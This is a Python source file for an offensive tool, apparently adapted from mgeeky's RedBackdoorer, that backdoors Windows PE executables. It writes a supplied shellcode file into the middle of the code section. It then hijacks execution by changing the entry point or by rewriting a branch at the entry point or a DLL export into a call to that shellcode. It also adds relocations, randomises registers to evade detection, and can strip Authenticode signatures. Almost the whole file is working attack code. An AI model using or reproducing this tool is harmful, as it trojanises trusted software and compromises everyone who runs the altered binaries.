#!/usr/bin/python3
#
# Based on: 
# Author:
#     Mariusz Banach / mgeeky '22-'23, (@mariuszbit)
#     <mb@binary-offensive.com>
#
# Requirements:
#   - pefile
#   - capstone
#   - keystone
#

import os, re, sys
import string
import shutil
import random
import tempfile
import argparse
import textwrap
import struct
import pefile
import capstone
import keystone
from enum import IntEnum
import logging

from helper import hexdump
from derbackdoorer.mype import MyPe

logger = logging.getLogger("DerBackdoorer")


class PeBackdoor:
    class SupportedSaveModes(IntEnum):
        WithinCodeSection   = 1
        NewPESection        = 2

    class SupportedRunModes(IntEnum):
        ModifyOEP           = 1
        BackdoorEP          = 2

        HijackExport        = 4

    availableSaveModes = {
        SupportedSaveModes.WithinCodeSection:   'store shellcode in the middle of code section',
        SupportedSaveModes.NewPESection:        'append shellcode to the PE file in a new PE section',
    }

    availableRunModes = {
        SupportedRunModes.ModifyOEP:    'change AddressOfEntryPoint',
        SupportedRunModes.BackdoorEP:   'modify first branching instruction from Original Entry Point',
    }

    def __init__(self):
        self.mype = None
        self.shellcodeOffset = 0     # from start of the file
        self.shellcodeOffsetRel = 0  # from start of the code section
        self.backdoorOffsetRel = 0   # from start of the code section


    def backdoor(self, saveMode, runMode, shellcode, infile, outfile):
        self.saveMode = saveMode
        self.runMode = runMode
        self.shellcode = shellcode
        self.infile = infile
        self.outfile = outfile

        try:
            PeBackdoor.SupportedSaveModes(saveMode)
        except:
            logger.critical(f'Unsupported save mode specified. Please see help message for a list of available save,run modes.')

        try:
            PeBackdoor.SupportedRunModes(runMode)
        except:
            logger.critical(f'Unsupported run mode specified. Please see help message for a list of available save,run modes.')

        try:
            with open(self.shellcode, 'rb') as f:
                self.shellcodeData = f.read()

            #if len(self.options['ioc']) > 0:
            #    self.shellcodeData += b'\x00\x00\x00\x00' + self.options['ioc'].encode() + b'\x00\x00\x00\x00'
            self.mype = MyPe()
            self.mype.openFile(self.infile)

            if not self.injectShellcode():
                logger.error('Could not inject shellcode into PE file!')
                return False

            if not self.setupShellcodeEntryPoint():
                logger.error('Could not setup shellcode launch within PE file!')
                return False

            remainingRelocsSize = self.mype.getRemainingRelocsDirectorySize()
            numOfRelocs = int((remainingRelocsSize - 8) / 2)
            logger.debug(f'Still can add up to {numOfRelocs} relocs tampering with shellcode for evasion purposes.')

            #if self.options['remove_signature']:
            #    self.removeSignature()

            logger.debug('Saving modified PE file...')
            self.mype.write(self.outfile)

            return True

        except pefile.PEFormatError:
            self.logger.warn('Input file is not a valid PE file.')
            return False

        except Exception as e:
            raise

        finally:
            self.mype.pe.close()

    def removeSignature(self):
        addr = self.mype.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress
        size = self.mype.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size

        self.mype.pe.set_bytes_at_rva(addr, b'\x00' * size)

        self.mype.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = 0
        self.mype.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size = 0

        logger.info('PE executable Authenticode signature removed.')
        return True
    
    def injectShellcode(self):
        if self.saveMode == int(PeBackdoor.SupportedSaveModes.WithinCodeSection):
            sect = self.mype.get_code_section()
            if sect == None:
                logger.error('Could not find code section in input PE file!')
                return False
            sect_name = sect.Name.decode().rstrip('\x00')
            sect_size = sect.Misc_VirtualSize  # Better than: SizeOfRawData
            logger.debug(f'Backdooring {sect_name} section.')

            if sect_size < len(self.shellcodeData):
                logger.critical(f'''Input shellcode is too large to fit into target PE executable code section!
Shellcode size    : {len(self.shellcodeData)}
Code section size : {sect_size}
''')

            offset = int((sect_size - len(self.shellcodeData)) / 2)
            logger.debug(f'Inserting shellcode into 0x{offset:x} offset.')

            self.mype.pe.set_bytes_at_offset(offset, self.shellcodeData)
            self.shellcodeOffset = offset
            self.shellcodeOffsetRel = offset - sect.PointerToRawData
    
            rva = self.mype.pe.get_rva_from_offset(offset)

            p = sect.PointerToRawData + sect.SizeOfRawData - 64
            graph = textwrap.indent(f'''
Beginning of {sect_name}:
{textwrap.indent(hexdump(self.mype.pe.get_data(sect.VirtualAddress), sect.VirtualAddress, 64), "0")}

Injected shellcode in the middle of {sect_name}:
{hexdump(self.shellcodeData, offset, 64)}

Trailing {sect_name} bytes:
{hexdump(self.mype.pe.get_data(self.mype.pe.get_rva_from_offset(p)), p, 64)}
''', '\t')

            logger.info(f'Shellcode injected into existing code section at RVA 0x{rva:x}')
            logger.debug(graph)
            return True


    def setupShellcodeEntryPoint(self):
        if self.runMode == int(PeBackdoor.SupportedRunModes.ModifyOEP):
            rva = self.mype.pe.get_rva_from_offset(self.shellcodeOffset)
            self.mype.set_entrypoint(rva)

            logger.info(f'Address Of Entry Point changed to: RVA 0x{rva:x}')
            return True

        elif self.runMode == int(PeBackdoor.SupportedRunModes.BackdoorEP):
            return self.backdoorEntryPoint()

        elif self.runMode == int(PeBackdoor.SupportedRunModes.HijackExport):
            addr = self.getExportEntryPoint()
            if addr == -1:
                logger.critical('Could not find any export entry point to hijack! Specify existing DLL Exported function with -e/--export!')

            return self.backdoorEntryPoint(addr)

        return False
    
    def getExportEntryPoint(self):
        dec = lambda x: '???' if x is None else x.decode() 

        #exportName = self.options.get('export', '')
        exportName = ""
        if len(exportName) == 0:
            logger.critical('Export name not specified! Specify DLL Exported function name to hijack with -e/--export')

        d = [pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
        self.mype.pe.parse_data_directories(directories=d)

        if self.mype.pe.DIRECTORY_ENTRY_EXPORT.symbols == 0:
            logger.error('No DLL exports found! Specify existing DLL Exported function with -e/--export!')
            return -1
        
        exports = [(e.ordinal, dec(e.name)) for e in self.mype.pe.DIRECTORY_ENTRY_EXPORT.symbols]

        for export in exports:
            logger.debug(f'DLL Export: {export[0]} {export[1]}')
            if export[1].lower() == exportName.lower():

                addr = self.mype.pe.DIRECTORY_ENTRY_EXPORT.symbols[export[0]].address
                logger.info(f'Found DLL Export "{exportName}" at RVA 0x{addr:x} . Attempting to hijack it...')
                return addr

        return -1

    def backdoorEntryPoint(self, addr = -1):
        imageBase = self.mype.pe.OPTIONAL_HEADER.ImageBase
        self.shellcodeAddr = self.mype.pe.get_rva_from_offset(self.shellcodeOffset) + imageBase

        cs = None
        ks = None

        if self.mype.arch == 'x86':
            cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32 + capstone.CS_MODE_LITTLE_ENDIAN)
            ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32 + keystone.KS_MODE_LITTLE_ENDIAN)
        else:    
            cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64 + capstone.CS_MODE_LITTLE_ENDIAN)
            ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64 + keystone.KS_MODE_LITTLE_ENDIAN)

        cs.detail = True

        ep = addr

        if addr == -1:
            ep = self.mype.pe.OPTIONAL_HEADER.AddressOfEntryPoint

        ep_ava = ep + self.mype.pe.OPTIONAL_HEADER.ImageBase
        data = self.mype.pe.get_memory_mapped_image()[ep:ep+128]
        offset = 0

        logger.debug('Entry Point disasm:')

        disasmData = self.mype.pe.get_memory_mapped_image()
        output = self.mype.disasmBytes(cs, ks, disasmData, ep, 128, self.backdoorInstruction)

        # store offset... by calculating it first FUCK
        section = self.mype.get_code_section()
        self.backdoorOffsetRel = output - section.VirtualAddress

        if output != 0:
            logger.debug('Now disasm looks like follows: ')

            disasmData = self.mype.pe.get_memory_mapped_image()
            self.mype.disasmBytes(cs, ks, disasmData, output - 32, 32, None, maxDepth = 3)

            logger.debug('\n[>] Inserted backdoor code: ')
            for instr in cs.disasm(bytes(self.compiledTrampoline), output):
                self.mype.printInstr(instr, 1)

            logger.debug('')
            self.mype.disasmBytes(cs, ks, disasmData, output + len(self.compiledTrampoline), 32, None, maxDepth = 3)

        else:
            logger.error('Did not find suitable candidate for Entry Point branch hijack!')

        return output

    def getBackdoorTrampoline(self, cs, ks, instr):
        trampoline = ''
        addrOffset = -1

        registers = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi']

        if self.mype.arch == 'x86':
            registers = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi'] 

        reg = random.choice(registers).upper()
        reg2 = random.choice(registers).upper()

        while reg2 == reg:
            reg2 = random.choice(registers).upper()

        enc, count = ks.asm(f'MOV {reg}, 0x{self.shellcodeAddr:x}')
        for instr2 in cs.disasm(bytes(enc), 0):
            addrOffset = len(instr2.bytes) - instr2.addr_size
            break

        found = instr.mnemonic.lower() in ['jmp', 'je', 'jz', 'jne', 'jnz', 'ja', 'jb', 'jae', 'jbe', 'jg', 'jl', 'jge', 'jle']
        found |= instr.mnemonic.lower() == 'call'

        if found:
            logger.info(f'Backdooring entry point {instr.mnemonic.upper()} instruction at 0x{instr.address:x} into:')

            jump = random.choice([
                f'CALL {reg}',

                #
                # During my tests I found that CALL reg works stabily all the time, whereas below two gadgets
                # are known to crash on seldom occassions.
                #

                #f'JMP {reg}',
                #f'PUSH {reg} ; RET',
            ])

            trampoline = f'MOV {reg}, 0x{self.shellcodeAddr:x} ; {jump}'

        for ins in trampoline.split(';'):
            logger.info(f'\t{ins.strip()}')

        logger.info('')

        return (trampoline, addrOffset)

    def backdoorInstruction(self, cs, ks, disasmData, startOffset, instr, operand, depth):
        encoding = b''
        count = 0

        if depth < 2: 
            return 0

        (trampoline, addrOffset) = self.getBackdoorTrampoline(cs, ks, instr)

        if len(trampoline) > 0:
            encoding, count = ks.asm(trampoline)
            self.mype.pe.set_bytes_at_rva(instr.address, bytes(encoding))

            relocs = (
                instr.address + addrOffset,
            )

            pageRva = 4096 * int((instr.address + addrOffset) / 4096)
            self.mype.addImageBaseRelocations(pageRva, relocs)

            self.trampoline = trampoline
            self.compiledTrampoline = encoding
            self.compiledTrampolineCount = count

            logger.info('Successfully backdoored entry point with jump/call to shellcode.\n')
            return instr.address

        return 0


def opts(argv):
    epilog = '''
<runmode>
      1 - change AddressOfEntryPoint
      2 - hijack branching instruction at Original Entry Point (jmp, call, ...)
      (4 - hijack branching instruction at DLL Exported function (use -e to specify export to hook))
'''

    o = argparse.ArgumentParser(
        usage = 'RedBackdoorer.py [options] <mode> <shellcode> <infile>',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog = textwrap.dedent(epilog)
    )
    
    req = o.add_argument_group('Required arguments')
    req.add_argument('runmode', help = 'PE Injection mode, see help epilog for more details.')
    req.add_argument('shellcode', help = 'Input shellcode file')
    req.add_argument('infile', help = 'PE file to backdoor')
    
    opt = o.add_argument_group('Optional arguments')
    opt.add_argument('-o', '--outfile', metavar='PATH', default='', help = 'Path where to save backdoored output file. If not given, will modify infile.')
    opt.add_argument('-v', '--verbose', action='store_true', help = 'Verbose mode.')

    bak = o.add_argument_group('Backdooring options')
    #bak.add_argument('-n', '--section-name', metavar='NAME', default=DefaultSectionName, 
    #    help = 'If shellcode is to be injected into a new PE section, define that section name. Section name must not be longer than 7 characters. Default: ' + DefaultSectionName)
    bak.add_argument('-i', '--ioc', metavar='IOC', default='', help = 'Append IOC watermark to injected shellcode to facilitate implant tracking.')
    bak.add_argument('-e', '--export', metavar='NAME', default='', help = 'When backdooring DLLs, this specifies name of the exported function to hijack.')

    sign = o.add_argument_group('Authenticode signature options')
    sign.add_argument('-r', '--remove-signature', action='store_true', help = 'Remove PE Authenticode digital signature since its going to be invalidated anyway.')

    args = o.parse_args()
    return args

def main(argv):
    print("DerBackdoorer")
    print("   based on RedBackdoorer.py, by mgeeky")
    args = opts(argv)
    if not args:
        return False

    outfile = ''
    temp = None

    if len(args.outfile) > 0:
        outfile = args.outfile

    else:
        temp = tempfile.NamedTemporaryFile(delete=False)
        shutil.copy(args.infile, temp.name)
        outfile = temp.name
        logger.debug(f'Outfile is a temporary file: {outfile}')

    saveMode = 1  # always
    try:
        runMode = int(args.runmode)
    except:
        logger.critical(f'<mode> Most be int')

    peinj = PeBackdoor()
    result = peinj.backdoor(saveMode, runMode, args.shellcode, args.infile, outfile)

    ret = 0
    if result :
        if len(args.outfile) > 0:
            logger.info(f'Backdoored PE file saved to: {args.outfile}')
        else:
            shutil.copy(outfile, args.infile)
            logger.info(f'Backdoored PE file in place.')
    else:
        ret = 1
        logger.critical('Could not backdoor input PE file!')

    if temp:
        logger.debug('Removing temporary file...')
        temp.close()
        os.unlink(temp.name)
    
    exit(ret)

if __name__ == '__main__':
    main(sys.argv)